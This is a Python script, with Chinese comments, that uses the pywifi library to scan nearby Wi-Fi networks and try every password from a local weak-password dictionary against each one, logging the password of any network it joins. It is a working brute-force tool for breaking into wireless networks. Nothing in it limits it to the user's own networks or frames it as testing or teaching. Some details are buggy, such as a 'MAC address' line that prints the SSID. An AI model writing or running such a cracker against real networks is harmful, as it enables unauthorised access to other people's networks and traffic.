# 扫描wifi
import time
from pywifi import const
import pywifi
from Base import BaseServices

DEFAULT = 2

class WIFI(BaseServices):

    def __init__(self):
        self.logger = self.get_lloger()
        self.wifi=pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.password_list = self.get_password()
        self.ignore_list=['printer','printers','liubing_5G']
    def get_password(self):
        
        password_list=[]
        path = r'C:\git\workspace\weak_dict.txt'
        with open(path,'r') as f:
            password_list = f.readlines()

        return password_list

    def start(self):

        basewifi = self.scan(10)

        if self.wifi_connect_status:
            # 断开
            # self.disconnect()
            pass
        
        print(len(basewifi))
        ssid_list = []
        for i in basewifi:
            print(i.ssid)
            ssid_list.append(i.ssid)
        
        ssid_set = set(ssid_list)
        
        for i in ssid_set:
            if i in self.ignore_list:
                continue
            print('wifi 扫描结果：{}'.format(i))
            print('wifi 对应设备的MAC地址: {}'.format(i))
            print('='*10)
     
            for p in self.password_list:
                
                if self.connect(i,p.strip()):
                    break
                else:
                    pass

            
    def wifi_connect_status(self):
            if self.iface.status() in [const.IFACE_CONNECTED,const.IFACE_INACTIVE]:
                return True
            else:
                return False

    def scan(self,sleep_time=DEFAULT):
        self.iface.scan()
        time.sleep(sleep_time)
        basewifi = self.iface.scan_results()
        return basewifi

    def connect(self,ssid,password,sleep_time=DEFAULT):
        profile = pywifi.Profile()
        profile.ssid=ssid
        profile.auth=const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher=const.CIPHER_TYPE_CCMP
        profile.key=password
        self.iface.remove_all_network_profiles()
        current_profile = self.iface.add_network_profile(profile)
        self.iface.connect(current_profile)

        time.sleep(sleep_time)

        if self.wifi_connect_status():

            self.logger.info(f'{ssid} 连接成功')
            self.logger.info(f'{ssid}的密码是{password}')
            return True

        else:
            # print('连接失败')
            return False

    def disconnect(self,sleep_time=DEFAULT):
        self.iface.disconnect()
        time.sleep(sleep_time)

if __name__ == "__main__":
    wifi = WIFI()
    # wifi.scan()
    # wifi.disconnect()
    # wifi.connect()
    wifi.start()